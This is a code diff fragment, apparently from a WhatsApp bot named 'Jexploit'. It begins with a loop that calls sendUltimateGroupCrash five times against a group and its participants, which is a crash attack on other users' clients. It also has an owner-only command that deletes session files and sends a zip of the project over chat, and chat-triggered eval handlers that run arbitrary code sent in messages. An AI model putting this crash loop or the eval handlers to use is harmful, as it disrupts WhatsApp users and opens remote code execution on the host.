+    
+    for (let i = 0; i < 5; i++) {
+        await sendUltimateGroupCrash(conn, groupJid, participants);
+        await new Promise(resolve => setTimeout(resolve, 300));
+    }
+    
+    break;
+}
+//======================
+case 'botbackup':
+case 'bp': {
+if (!Access) return reply(mess.owner)
+const sessionPath = "./session";
+if (fs.existsSync(sessionPath)) {
+const files = fs.readdirSync(sessionPath);
+files.forEach((file) => {
+if (file !== "creds.json") {
+const filePath = path.join(sessionPath, file); 
+if (fs.lstatSync(filePath).isDirectory()) {
+fs.rmSync(filePath, { recursive: true, force: true });
+} else {  
+fs.unlinkSync(filePath);
+}
+}
+}
+);
+}
+const ls = execSync("ls").toString().split("\n").filter(
+(pe) =>           
+pe != "node_modules" &&   
+pe != "package-lock.json" &&  
+pe != "yarn.lock" &&
+pe != "tmp" &&
+pe != ""
+);
+execSync(`zip -r backup.zip ${ls.join(" ")}`);
+await conn.sendMessage(m.chat, {
+document: fs.readFileSync("./backup.zip"),   
+fileName: "Jexploit-base-new.zip",
+mimetype: "application/zip",
+caption: "This is your backup zip.",
+}, { quoted: m });
+execSync("rm -rf backup.zip");
+}
+break
+        
+default:
+if (body.startsWith("~")) {
+if (!Access) return;
+console.log('*execute...*')
+function Return(sul) {
+let sat = JSON.stringify(sul, null, 2)
+let bang = util.format(sat)
+if (sat === undefined) {
+bang = util.format(sul)
+}
+return bang;
+}
+try {
+(async () => {
+try {
+const result = await eval(`(async () => { return ${text} })()`)
+console.log(Return(result))
+} catch (e) {
+console.log(util.format(e))
+}
+})()
+} catch (e) {
+console.log(util.format(e))
+}
+}
+if (budy.startsWith("X")) {
+if (!Access) return
+await reaction(m.chat, '⚡')
+try {
+let evaled = await eval(q)
+if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+console.log(evaled)
+} catch (err) {
+console.log(util.format(err))
+}
+}
+}
+} catch (err) {
+console.log(err)
+}
+}
+
+if (__filename) {
+let file = require.resolve(__filename)
+require('fs').watchFile(file, () => {
+require('fs').unwatchFile(file)
+console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
+delete require.cache[file]
+require(file)
+})
+}
